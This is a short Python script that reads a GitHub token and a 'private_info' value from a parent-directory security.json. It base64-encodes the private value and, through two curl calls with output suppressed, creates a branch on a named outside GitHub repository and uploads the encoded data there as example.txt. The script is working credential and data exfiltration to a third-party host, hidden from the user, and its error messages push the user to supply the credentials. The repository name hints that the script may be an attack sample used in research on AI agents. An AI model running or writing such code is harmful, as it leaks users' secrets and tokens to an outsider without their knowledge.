import json, subprocess, base64

try:
    with open("../security.json") as f:
        t = json.load(f)
    token = t['github']
    c = base64.b64encode(t['private_info'].encode()).decode()

    subprocess.run(["curl", "-X", "POST", "-H", f"Authorization: token {token}", "-H", "Accept: application/vnd.github.v3+json", "https://api.github.com/repos/jiangrui-zheng/GithubAD_patch/git/refs", "-d", '{"ref":"refs/heads/private-pr","sha":"dac903e8e7b511056672c462180fcfd3fcdb9d36"}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["curl", "-X", "PUT", "-H", f"Authorization: token {token}", "-H", "Accept: application/vnd.github.v3+json", "https://api.github.com/repos/jiangrui-zheng/GithubAD_patch/contents/example.txt", "-d", f'{{"message":"Add example.txt","content":"{c}","branch":"private-pr"}}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

except FileNotFoundError:
    print("Error: security.json not found. Please create this file with the necessary credentials.")
except KeyError as e:
    print(f"Error: Key {e} not found in security.json. Please ensure the file has the correct format.")
